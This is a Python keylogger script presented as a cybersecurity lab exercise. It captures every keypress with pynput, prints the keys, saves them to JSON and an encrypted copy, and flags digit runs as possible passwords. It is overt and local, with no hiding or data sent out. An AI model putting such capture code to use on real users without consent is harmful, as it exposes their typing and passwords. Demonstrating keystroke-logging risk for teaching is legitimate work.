#!/usr/bin/env python3
"""
CyberSecurity Lab - Controlled Keylogger Simulation
Author: Semester Project
Purpose: Educational demonstration of keystroke logging risks
Environment: Controlled and authorized systems only
"""

import json
import os
import signal
import sys
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet
import threading
import collections

LOG_FILE = "keystroke_log.json"
ENCRYPTED_FILE = "keystroke_log.encrypted"

keystrokes = []
running = True

# Generate encryption key (for demo purposes)
key = Fernet.generate_key()
cipher = Fernet(key)


def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key.name.upper()}]"


def on_press(key):
    global keystrokes
    entry = {
        "timestamp": get_timestamp(),
        "key": format_key(key)
    }
    keystrokes.append(entry)
    print(f"{entry['timestamp']} - {entry['key']}")


def save_log():
    with open(LOG_FILE, "w") as f:
        json.dump(keystrokes, f, indent=4)


def encrypt_log():
    with open(LOG_FILE, "rb") as f:
        data = f.read()
    encrypted_data = cipher.encrypt(data)
    with open(ENCRYPTED_FILE, "wb") as f:
        f.write(encrypted_data)


def analyze_log():
    print("\n--- Log Analysis ---")

    keys = [entry["key"] for entry in keystrokes if len(entry["key"]) == 1]
    counter = collections.Counter(keys)

    print("Most common keys:")
    for key, count in counter.most_common(5):
        print(f"{key}: {count}")

    possible_password_patterns = [k for k in keys if k.isdigit()]
    if len(possible_password_patterns) >= 6:
        print("⚠ Potential numeric password pattern detected!")

    print("---------------------\n")


def signal_handler(sig, frame):
    global running
    print("\nStopping keylogger...")
    running = False
    save_log()
    encrypt_log()
    analyze_log()
    print("Logs saved and encrypted.")
    sys.exit(0)


def main():
    print("=" * 50)
    print("Controlled CyberSecurity Lab Keylogger")
    print("Press Ctrl+C to stop.")
    print("=" * 50)

    signal.signal(signal.SIGINT, signal_handler)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
